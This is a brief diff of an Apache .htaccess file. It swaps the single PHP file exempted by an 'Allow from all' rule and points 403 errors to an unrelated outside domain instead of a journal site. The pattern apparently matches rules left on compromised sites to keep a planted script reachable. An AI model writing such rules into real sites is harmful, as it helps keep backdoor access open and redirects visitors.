@@ -70,8 +70,8 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(filelocale.php)$">
+<FilesMatch "^(IndexHandler.php)$">
 Allow from all
 </FilesMatch>
 Options -Indexes
-ErrorDocument 403 https://journal.staimsyk.ac.id/
+ErrorDocument 403 https://zoologicalrecords.com/
